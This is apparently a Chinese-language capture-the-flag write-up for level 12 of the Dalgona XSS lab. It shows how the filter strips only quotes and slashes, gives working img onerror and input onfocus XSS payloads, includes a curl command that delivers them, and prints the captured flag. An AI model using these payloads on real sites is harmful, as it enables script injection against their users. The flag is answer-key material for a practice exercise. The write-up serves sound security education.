## 题解

### 入口与指纹

`Werkzeug/1.0.1` + `Python/2.7.18`，Dalgona 靶场第 12 关
（样式表 `static/css/xss/xss12.css`，标题 `Dalgona - Triangle`）。

反射在文本节点，模板尾部自带一个 `>`：

```html
<input type=text name=name placeholder="Enter your name..." > INPUT>
```

### 关键观察

**1. 过滤器只删两个字符：`'` 和 `/`。**

94 个可打印字符逐个探测，只有这两个会让输入消失（反射变成模板自带的 `>`）。

**2. 双引号完全可用，所以不需要单引号。**

```text
<img src=x onerror=alert("XSS")>     通过
<input autofocus onfocus=alert("XSS")>  通过
```

`svg onload`、`body onload` 反而失败——本关接受 `img onerror` 和 `input onfocus`。

### 利用链

```bash
T=$(head -1 .target)
curl -sS --get \
  --data-urlencode 'name=<img src=x onerror=alert("XSS")>' \
  "http://$T/page" \
| grep -o 'flag{[^}]*}'
```

```text
flag{431d867b-e6a8-40de-b2b2-e51c55f24f2f}
```

### flag 位置

成功响应的 `solution-text` 区块，`Here is the flag:` 之后。

## 复盘

- **`/` 被删意味着不能用自闭合标签**，但 `<img src=x onerror=…>` 本来就不需要 `/`；
  只需要属性和事件，不需要闭合。
- **`'` 被删意味着参数必须用双引号。** 这里输入在文本节点（不在属性里），
  所以双引号不会截断任何东西，可以放心用 `alert("XSS")`。
- **本关接受 `img onerror` + `input onfocus`，拒绝 `svg/body onload`**——
  与 046（只接受 svg/body onload）正好互补，说明评测端的判定集合是逐关配置的。
- **逐字符探测依然是最有效的第一步**：两个字符的结论直接决定了 payload 形态。
